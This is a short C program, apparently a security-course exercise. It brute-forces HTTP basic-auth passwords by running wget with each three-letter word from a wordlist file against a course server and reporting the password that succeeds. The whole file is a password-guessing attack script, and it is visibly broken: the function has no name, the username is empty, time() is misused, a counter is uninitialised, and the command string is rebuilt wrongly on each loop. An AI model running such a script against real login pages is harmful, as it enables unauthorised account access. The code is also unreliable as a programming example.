#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>
#include <sys/time.h>
#include <strings.h>
#include <ctype.h>

int ()
{
  int time1, time2, time_var;
  int timeinsec, nofattempts;
  char url[100], url1[80];
  strcpy(url, "wget --http-user= --http-passwd=");
  strcpy(url1, " http://sec-crack.cs.rmit.edu./SEC/2/ -o out.txt");
  char word[15], *chk;
  chk = "word";
  FILE *fp;
  int syst = 1;
  fp = fopen("words", "r");
  time1 = time();
  while(chk != NULL)
  {
    chk = fgets(word, 15, fp);
    if (chk == NULL) exit(1);
    word [ strlen(word) - 1 ] = '\0';
    strcat(url, word);
    strcat(url, url1);
    if (strlen(word) == 3)
    {
      syst = system(url);
      nofattempts = nofattempts + 1;
      printf("\n %s %d\n",word,nofattempts);
    }
    if (syst == 0)
    {
       time2 = time();
       time_var = time2 - time1;
       timeinsec = time_var/1000000000;
       printf("\n The Password is: %s",word);
       printf("\n  of Attempts: %d\n",nofattempts);
       printf("\n Time Taken: %d seconds\n", timeinsec);
       exit(1);
    }
    strcpy(url, "");
    strcpy(url, "wget --http-user= --http-passwd=");
  }
}
